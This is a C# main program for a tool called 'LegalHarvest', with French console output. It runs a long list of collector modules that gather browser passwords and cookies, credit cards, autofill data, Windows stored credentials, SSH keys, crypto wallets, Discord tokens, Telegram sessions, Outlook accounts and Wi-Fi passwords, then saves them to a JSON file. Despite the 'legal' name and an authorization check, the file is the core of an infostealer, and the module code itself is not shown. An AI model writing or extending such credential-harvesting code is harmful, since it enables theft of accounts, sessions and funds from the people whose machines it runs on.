using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using LegalHarvest.Modules;
using Newtonsoft.Json;

namespace LegalHarvest
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            LegalGuard.EnsureAuthorized();

            var config = Config.Load("config.json");
            string outputDir = Path.Combine(Path.GetTempPath(), $"LegalHarvest_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(outputDir);
            Console.WriteLine($"[*] Dossier de sortie : {outputDir}");

            var modules = new List<ICollectorModule>
            {
                new SystemInfoModule(),
                new AllChromiumBrowsersPasswordsModule(),
                new AllChromiumBrowsersCookiesModule(),
                new SocialMediaCookiesModule(),
                new FirefoxPasswordsModule(),
                new FirefoxCookiesModule(),
                new BrowserHistoryModule(),
                new CreditCardsModule(),
                new AutofillDataModule(),
                new WindowsCredentialManagerModule(),
                new ClipboardContentModule(),
                new InstalledSoftwareModule(),
                new ProcessListModule(),
                new SensitiveFilesModule(),
                new SSHKeysModule(),
                new GamingClientsModule(),
                new VPNClientsModule(),
                new MessagingAppsModule(),
                new DesktopAppSessionsModule(),
                new CryptoWalletsModule(),
                new CryptoWalletsExtensionsModule(),
                new DiscordAllTokensModule(),
                new TelegramAllSessionsModule(),
                new OutlookAccountsModule(),
                new WifiPasswordsModule(),
                new FtpVpnModule()
            };

            if (config.EnabledModules != null && config.EnabledModules.Any())
                modules = modules.Where(m => config.EnabledModules.Contains(m.ModuleName, StringComparer.OrdinalIgnoreCase)).ToList();

            var allItems = new List<CollectedItem>();
            foreach (var module in modules)
            {
                if (!module.CanExecute())
                {
                    Console.WriteLine($"[~] {module.ModuleName} : non applicable.");
                    continue;
                }
                try
                {
                    var items = module.Collect();
                    if (items != null)
                    {
                        allItems.AddRange(items);
                        Console.WriteLine($"[+] {module.ModuleName} : {items.Count} élément(s)");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] {module.ModuleName} : {ex.Message}");
                }
            }

            string jsonFile = Path.Combine(outputDir, "harvest.json");
            File.WriteAllText(jsonFile, JsonConvert.SerializeObject(allItems, Formatting.Indented));
            Console.WriteLine($"[i] Résultat : {jsonFile}");
            Console.WriteLine("[✓] Terminé.");
        }
    }
}
